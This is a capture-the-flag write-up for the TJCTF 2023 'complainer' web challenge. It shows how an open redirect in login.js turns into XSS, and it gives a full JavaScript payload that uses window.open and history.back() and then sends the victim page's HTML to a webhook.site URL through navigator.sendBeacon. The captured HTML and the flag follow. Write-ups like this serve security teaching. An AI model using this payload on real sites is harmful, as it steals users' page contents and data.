# TJCTF 2023 - web - complainer

`login.js`:
```javascript
function redirect() {
    if ('sessionId' in localStorage && 'userId' in localStorage)
        window.location = new URLSearchParams(window.location.search).get('next') ?? '/';
}
```
It has an open redirect vulnerability, which allows XSS with `javascript:`.

My solution used `open` and History API to steal a flag. The XSS payload is as follows:
```javascript
const childUrl = "https://complainer.tjc.tf/login?next=" + encodeURIComponent(`javascript:const sleep = (msecs) => new Promise((r) => setTimeout(r, msecs));
const main = async () => {
  opener.history.back();
  await sleep(1000);
  navigator.sendBeacon(
    "https://webhook.site/xxxxx",
    opener.document.body.innerHTML
  );
};
main();`);

const parentUrl = "https://complainer.tjc.tf/login?next=" + encodeURIComponent("javascript:open(`" + childUrl + "`)");

console.log(parentUrl);
```

I reported `parentUrl`, and got the following HTML:
```html
    <nav>
        <a href="/">Complainer</a>
    </nav>

    <div class="main">
        <div class="complaint"><span id="0-t" style="font-size: 0.0692308em;">t</span><span id="1-j" style="font-size: 0.138462em;">j</span><span id="2-c" style="font-size: 0.207692em;">c</span><span id="3-t" style="font-size: 0.276923em;">t</span><span id="4-f" style="font-size: 0.346154em;">f</span><span id="5-{" style="font-size: 0.415385em;">{</span><span id="6-g" style="font-size: 0.484615em;">g</span><span id="7-r" style="font-size: 0.553846em;">r</span><span id="8-r" style="font-size: 0.623077em;">r</span><span id="9-r" style="font-size: 0.692308em;">r</span><span id="10-r" style="font-size: 0.761538em;">r</span><span id="11-r" style="font-size: 0.830769em;">r</span><span id="12-r" style="font-size: 0.9em;">r</span><span id="13-r" style="font-size: 0.969231em;">r</span><span id="14-r" style="font-size: 1.03846em;">r</span><span id="15-r" style="font-size: 1.10769em;">r</span><span id="16-_" style="font-size: 1.17692em;">_</span><span id="17-3" style="font-size: 1.24615em;">3</span><span id="18-1" style="font-size: 1.31538em;">1</span><span id="19-5" style="font-size: 1.38462em;">5</span><span id="20-b" style="font-size: 1.45385em;">b</span><span id="21-9" style="font-size: 1.52308em;">9</span><span id="22-c" style="font-size: 1.59231em;">c</span><span id="23-0" style="font-size: 1.66154em;">0</span><span id="24-f" style="font-size: 1.73077em;">f</span><span id="25-}" style="font-size: 1.8em;">}</span></div>
    </div>

    <script src="/static/complaint.js"></script>
```

Flag:
```
tjctf{grrrrrrrrr_315b9c0f}
```
